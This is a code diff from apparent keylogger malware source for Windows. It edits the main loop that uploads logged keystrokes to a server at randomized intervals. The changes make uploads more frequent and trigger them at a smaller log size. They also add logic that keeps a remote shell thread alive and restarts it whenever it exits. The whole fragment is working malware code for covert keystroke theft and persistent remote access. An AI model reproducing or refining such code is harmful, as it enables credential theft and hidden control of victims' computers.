@@ -66,17 +66,17 @@ DWORD RemoteShellThread(LPVOID args)
 void KeyLoggerLoop()
 {
 	DWORD old_time = 0;
+	HANDLE hthread = NULL; // remote shell thread
 
 	// init rand generator seed
 	srand(GetTickCount());
-
 	while (IsKeyLoggerRunning)
 	{
-		// every 5-10 mins, upload log to server
+		// upload log to server after specified timespan
 		DWORD current_time = GetTickCount();
-		DWORD rand_time_span = rand() % 20000 + 10000;//600000 + 300000; // 600000 = 10 mins in milliseconds, 300000 = 5 mins
-		DWORD file_size = log_file.GetFileSize(); // file must be > 255 bytes before being sent over the net
-		if ( (file_size >= 255) && 
+		DWORD rand_time_span = rand() % 10000 + 5000;//600000 + 300000; // 600000 = 10 mins in milliseconds, 300000 = 5 mins
+		DWORD file_size = log_file.GetFileSize(); // file must be > 100 bytes before being sent over the net
+		if ( (file_size >= 100) && 
 			 (old_time == 0 || (current_time - old_time) >= rand_time_span))
 		{
 			// update oldtime for next iteration
@@ -90,13 +90,16 @@ void KeyLoggerLoop()
 			}
 		}
 
-		// keep alive remove shell
-		if (!client->IsRemoteShellConnected())
+		// keep alive remote shell
+		DWORD exitCode = 0;
+		if (hthread != NULL) // we are not running for the first time
+			GetExitCodeThread(hthread, &exitCode);
+		if (exitCode != STILL_ACTIVE)
 		{
 			// (re-)initialize the remote shell
-			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RemoteShellThread, client, 0, NULL);
+			hthread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RemoteShellThread, client, 0, NULL);
 		}
-		Sleep(100);
+		Sleep(500);
 	}
 }
 
